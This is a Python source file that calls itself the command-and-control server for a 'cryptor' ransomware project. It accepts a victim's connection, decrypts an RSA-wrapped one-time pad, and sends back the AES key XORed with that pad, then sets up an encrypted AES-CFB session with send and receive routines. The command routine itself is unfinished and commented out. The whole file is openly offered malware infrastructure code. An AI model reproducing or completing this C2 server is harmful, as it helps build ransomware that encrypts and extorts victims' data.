# Copyright (C) 2020  @Qu3b411
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# This will eventually be the command and control center for the cryptor malware
# the C2.py file being imported is automattically generated by the make file,
# this makes it easy to define variables at the start that do not need to be changed
# after everything is set up.

from C2 import *;
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
import socket
import base64

def applyOTP(OTP, KEY):
    return bytes(o ^ k for o, k in zip(OTP, KEY))

#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
sock = socket.socket()
sock.bind(('127.0.0.1',PORT_SVR))
sock.listen(1)
conn, addr = sock.accept()

######################################################################################
######################################################################################
#               BEGIN CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                    #
######################################################################################
######################################################################################

print("C2 Server >> Victim",addr,'connected')
OTPPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
if(conn.send(b"\x01") != 1):
    print("An error has occured in this connection before the EncryptedOTP could be recieved");
    sys.exit(-1)
EncryptedOTP = conn.recv(OTPPacketLen)
rsaKey = RSA.import_key(PRVKEY)
cipher = PKCS1_v1_5.new(rsaKey)
OTP = cipher.decrypt(EncryptedOTP,"failed")
aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)      
OTPencodedAESKey = applyOTP(OTP,aesKey)
conn.send(OTPencodedAESKey);
# initiate the session key
SessionKeyPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
if(conn.send(b"\x01") != 1):
    print("An error has occured in this connection before the EncryptedOTP could be recieved");
    sys.exit(-1)
EncryptedKey = conn.recv(SessionKeyPacketLen)
SessionKey = cipher.decrypt(EncryptedKey,"failed")
if(conn.send(b"\x01") != 1):
    print("An error has occured in this connection before the EncryptedOTP could be recieved");
    sys.exit(-1)
SessionIV = conn.recv(16);
if(conn.send(b"\x01") != 1):
    print("An error has occured in this connection before the EncryptedOTP could be recieved");
    sys.exit(-1)

def secure_send(buf: bytes,length: int):
    global SessionIV
    # Synchronize Buffer
    conn.recv(1)
    sessionCipher = AES.new(SessionKey, AES.MODE_CFB, SessionIV)
    conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
    # Synchronize buffer
    conn.recv(1)
    ciphertext = sessionCipher.encrypt(buf);
    # send the cipher text back to the client
    # the session IV has allready been updated in this instance. 
    conn.send(ciphertext)
    SessionIV = conn.recv(16)
   
def secure_recv():
    global SessionIV
    sessionCipher = AES.new(SessionKey, AES.MODE_CFB, SessionIV)
    msgSZ = int.from_bytes(conn.recv(8),byteorder='big',signed=False) 
    if(conn.send(b"\x01") != 1):
        print("An error has occured in this connection before the EncryptedOTP could be recieved")
        sys.exit(-1)
    MSG = conn.recv(msgSZ)
    if(conn.send(b"\x01") != 1):
        print("An error has occured in this connection before the EncryptedOTP could be recieved")
        sys.exit(-1)    
    plaintext = sessionCipher.decrypt(MSG[16:])
    SessionIV = MSG[:16]
    return plaintext;
    
    
######################################################################################
######################################################################################
#               END CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                      #
######################################################################################
######################################################################################
#               BEGIN SERVER/CLIENT COMMUNICATION ROUTINE                            #
######################################################################################
######################################################################################
# print(str(secure_recv()))
# print(str(secure_recv()))
# print(str(secure_recv()))
# secure_send(bytearray(b'hello world'),11)
# secure_send(bytearray(b'hello world this is the server'),30)

